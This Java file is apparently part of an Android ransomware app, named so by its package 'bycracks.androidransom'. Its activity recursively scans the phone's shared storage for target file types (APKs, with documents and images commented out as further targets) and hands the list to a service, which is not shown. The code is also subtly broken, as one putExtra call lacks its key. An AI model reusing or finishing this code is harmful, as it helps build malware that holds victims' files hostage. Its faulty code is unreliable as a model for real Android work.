package bycracks.androidransom;

import android.content.Intent;
import android.os.Bundle;
import android.os.Environment;
import android.support.v7.app.AppCompatActivity;
import android.widget.ArrayAdapter;
import android.widget.ListView;

import java.io.File;
import java.util.ArrayList;


public class SubActivity extends AppCompatActivity {
    String[] ext = {".apk"/*, ".txt", ".pdf", ".zip", ".hwp", ".ppt", ".pptx", ".jpg", ".jpeg"*/};
    ArrayList <File> myList = new ArrayList<File>();
    ArrayList <String> fileNames = new ArrayList<String>();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_sub);


        String rootSD = Environment.getRootDirectory().toString();
        File f = new File(rootSD + "/../storage/emulated/0/");
        searchAllFile(f);

        ListView listview = (ListView) findViewById(R.id.list);
        listview.setAdapter(new ArrayAdapter<String>(SubActivity.this, android.R.layout.simple_list_item_1,fileNames));

        Intent intent = new Intent(SubActivity.this, MyService.class);
        intent.putExtra(myList);
        startService(intent);

    }


    public void searchAllFile(File fileList){
        File[] files = fileList.listFiles();
        if (files == null)
            return;

        for(File inFile : files) {
            if (inFile.isDirectory()) {
                searchAllFile(inFile);
            }
            for (String list : ext)
                if (inFile.getName().endsWith(list)) {
                    fileNames.add(inFile.getName());
                    myList.add(inFile);
                }

        }
    }



}
